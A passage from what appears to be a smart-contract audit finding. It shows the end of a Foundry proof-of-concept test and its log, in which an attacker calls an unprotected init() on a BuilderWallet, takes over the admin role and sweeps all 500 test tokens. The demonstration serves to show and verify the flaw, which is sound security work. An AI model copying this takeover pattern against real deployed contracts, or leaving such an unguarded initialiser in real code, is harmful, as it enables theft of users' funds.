    vm.prank(attacker);\n        BuilderWallet(wallet).sweep(address(token), attacker);\n        uint256 attackerBalanceAfter = token.balanceOf(attacker);\n\n        console.log(\"Funds stolen:\", (attackerBalanceAfter - attackerBalanceBefore) / 1e18, \"TEST\");\n        console.log(\"Wallet balance:\", token.balanceOf(wallet));\n        console.log(\"Attacker balance:\", attackerBalanceAfter / 1e18, \"TEST\");\n\n        // Verify complete theft\n        assertEq(token.balanceOf(wallet), 0);\n        assertEq(attackerBalanceAfter - attackerBalanceBefore, 500 ether);\n\n        console.log(\"COMPLETE ATTACK SUCCESSFUL!\");\n        console.log(\"Attacker stole all 500 TEST tokens!\");\n    }\n}\n```\n\n\n```solidity\n[PASS] test_CompleteAttackScenario() (gas: 336125)\nLogs:\n  ATTACK SCENARIO\n  Wallet deployed: 0xD6b210673C590d2d20D20aCd8713EFA9Dcb001Ba\n  Initial admin: 0x0000000000000000000000000000000000000002\n  \nFees accumulated: 500 TEST tokens\n  \nATTACK PHASE:\n  Attacker calling init()...\n  Admin hijacked to: 0x0000000000000000000000000000000000000003\n  \nEXPLOIT PHASE:\n  Funds stolen: 500 TEST\n  Wallet balance: 0\n  Attacker balance: 500 TEST\n  COMPLETE ATTACK SUCCESSFUL!\n  Attacker stole all 500 TEST tokens!\n```",
